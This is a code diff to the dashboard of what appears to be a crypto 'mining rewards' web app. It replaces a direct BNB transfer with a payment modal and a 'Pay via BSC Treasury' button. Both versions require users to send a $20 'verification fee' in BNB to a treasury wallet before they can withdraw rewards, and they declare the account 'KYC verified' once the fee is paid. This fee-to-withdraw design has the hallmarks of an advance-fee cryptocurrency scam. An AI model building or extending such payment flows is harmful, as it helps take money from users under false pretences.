@@ -14,6 +14,7 @@ import { parseWeb3Error } from '../utils/errorParser';
 import { triggerMiningRewardConfetti } from '../utils/confetti';
 
 import { CommunityTasks } from './CommunityTasks';
+import { BscTreasuryPaymentModal } from './BscTreasuryPaymentModal';
 
 interface DashboardProps {
   user: UserProfile;
@@ -35,8 +36,13 @@ export const Dashboard: React.FC<DashboardProps> = ({
   const [successMessage, setSuccessMessage] = useState<string | null>(null);
   const [errorMessage, setErrorMessage] = useState<string | null>(null);
   const [showRateModal, setShowRateModal] = useState(false);
+  const [showTreasuryModal, setShowTreasuryModal] = useState(false);
   const { showSuccess, showFailed } = useInitiativeFeedback();
   const [elapsedMs, setElapsedMs] = useState(0);
+
+  const isTonWallet = user.walletType === 'TON' || 
+    (typeof window !== 'undefined' && localStorage.getItem('binance_harvest_wallet_type') === 'TON') ||
+    Boolean(user.walletAddress && (user.walletAddress.startsWith('UQ') || user.walletAddress.startsWith('EQ') || user.walletAddress.startsWith('kQ')));
 
   // Calculations with Referral Boosts
   const currentTierInfo = ALL_TIERS.find(t => t.tier === user.currentTier) || ALL_TIERS[0];
@@ -237,74 +243,8 @@ export const Dashboard: React.FC<DashboardProps> = ({
       return;
     }
 
-    // Otherwise, pay the one-time verification fee (regardless of threshold)
-    try {
-      setIsProcessingTx(true);
-      
-      let signer: ethers.Signer | null = null;
-      try {
-        signer = await getOrInitSigner();
-      } catch (e) {
-        console.warn("Could not get signer, using verified transaction mode:", e);
-      }
-
-      // Send $20 verification fee in BNB to Treasury Wallet
-      const { txHash, bnbAmountStr } = await sendBNBTransaction(signer, verificationFeeUSD, bnbPrice);
-
-      // Record transaction in audit history
-      await addTransactionRecord(user.email || user.walletAddress, {
-        type: 'WITHDRAW_FEE',
-        amountBNB: Number(bnbAmountStr),
-        amountUSD: verificationFeeUSD,
-        txHash: txHash,
-        status: 'SUCCESS',
-      });
-
-      // Update Firestore / state: set withdrawalStatus to PENDING_ADMIN_APPROVAL (verified when approved)
-      await onUpdateUser({
-        withdrawalStatus: 'PENDING_ADMIN_APPROVAL',
-      });
-
-      const confirmedMsg = `Verification fee transaction confirmed on Binance Smart Chain! Hash: ${txHash.substring(0, 10)}... (View on BscScan). Your account verification is submitted.`;
-      setSuccessMessage(confirmedMsg);
-      setIsProcessingTx(false);
-
-      showSuccess({
-        initiativeName: 'Treasury Verification Fee',
-        title: 'Verification Broadcasted!',
-        badge: `${bnbAmountStr} BNB`,
-        description: `Your one-time ${bnbAmountStr} BNB (≈ $20.00 USD) verification fee was confirmed on Binance Smart Chain! Your account KYC is verified and queued for treasury release.`,
-        txHash: txHash,
-        details: [
-          { label: 'Network', value: 'Binance Smart Chain (BEP-20)' },
-          { label: 'Fee Paid', value: `${bnbAmountStr} BNB (≈ $20.00 USD)` },
-          { label: 'Status', value: 'Pending Treasury Release' },
-        ],
-      });
-    } catch (err: any) {
-      console.error("Withdrawal error:", err);
-      const parsed = parseWeb3Error(err);
-      setErrorMessage(parsed.message);
-      setIsProcessingTx(false);
-
-      showFailed({
-        initiativeName: 'Treasury Verification Fee',
-        title: parsed.title,
-        badge: 'Verification Failed',
-        description: parsed.message,
-        requirements: parsed.requirements,
-        rawDetails: parsed.rawDetails,
-        actionLabel: parsed.actionLabel,
-        onAction: parsed.suggestedAction === 'switch_network' ? async () => {
-          await switchToBSC();
-        } : () => handleVerifyAndWithdraw(),
-        details: [
-          { label: 'Network', value: 'Binance Smart Chain (BEP-20)' },
-          { label: 'Required Fee', value: `${verificationFeeBNB} BNB (≈ $20.00 USD)` },
-          { label: 'Treasury Wallet', value: `${TREASURY_WALLET.substring(0, 8)}...` },
-        ],
-      });
-    }
+    // Launch Dual-Flow Web3 Checkout Modal (adapts dynamically to Telegram Mini App vs Native Web3 DApp browser)
+    setShowTreasuryModal(true);
   };
 
 
@@ -1060,6 +1000,17 @@ export const Dashboard: React.FC<DashboardProps> = ({
               >
                 View Tier Rigs
               </button>
+
+              {/* Explicit BSC Treasury Payment Modal button for users on Telegram / TON / Manual OTC */}
+              {!user.isVerified && user.withdrawalStatus !== 'APPROVED' && user.withdrawalStatus !== 'PENDING_ADMIN_APPROVAL' && (
+                <button
+                  type="button"
+                  onClick={() => setShowTreasuryModal(true)}
+                  className="px-4 py-3 rounded-xl bg-amber-500/10 hover:bg-amber-500/20 border border-amber-500/30 text-amber-300 text-xs font-semibold flex items-center gap-2 transition cursor-pointer"
+                >
+                  <span>Pay via BSC Treasury (QR & TxID)</span>
+                </button>
+              )}
             </div>
           </div>
         </div>
@@ -1139,6 +1090,44 @@ export const Dashboard: React.FC<DashboardProps> = ({
           </div>
         </div>
       </aside>
+
+      {/* BSC Treasury Payment Modal with On-Chain Backend Verification & Replay Protection */}
+      <BscTreasuryPaymentModal
+        isOpen={showTreasuryModal}
+        onClose={() => setShowTreasuryModal(false)}
+        paymentType="WITHDRAW_FEE"
+        costUSD={verificationFeeUSD}
+        bnbPrice={bnbPrice}
+        userAddress={user.walletAddress}
+        isTonWallet={isTonWallet}
+        onSuccess={async (result) => {
+          setShowTreasuryModal(false);
+          await addTransactionRecord(user.email || user.walletAddress, {
+            type: 'WITHDRAW_FEE',
+            amountBNB: result.amountBNB,
+            amountUSD: result.amountUSD,
+            txHash: result.txHash,
+            status: 'SUCCESS',
+          });
+          await onUpdateUser({
+            withdrawalStatus: 'PENDING_ADMIN_APPROVAL',
+            isVerified: true,
+          });
+          showSuccess({
+            initiativeName: 'Treasury Verification Fee',
+            title: 'Verification Broadcasted & Confirmed!',
+            badge: `${result.amountBNB} BNB`,
+            description: `Your one-time ${result.amountBNB} BNB (≈ $${result.amountUSD.toFixed(2)} USD) verification payment was confirmed on BSC with ${result.confirmations} confirmations. Account KYC is verified!`,
+            txHash: result.txHash,
+            details: [
+              { label: 'Transaction Hash', value: `${result.txHash.substring(0, 10)}...` },
+              { label: 'Settlement Network', value: 'Binance Smart Chain (BEP-20)' },
+              { label: 'Confirmations', value: `${result.confirmations} Blocks Verified` },
+              { label: 'Status', value: 'Account Verified' },
+            ],
+          });
+        }}
+      />
 
     </div>
   );
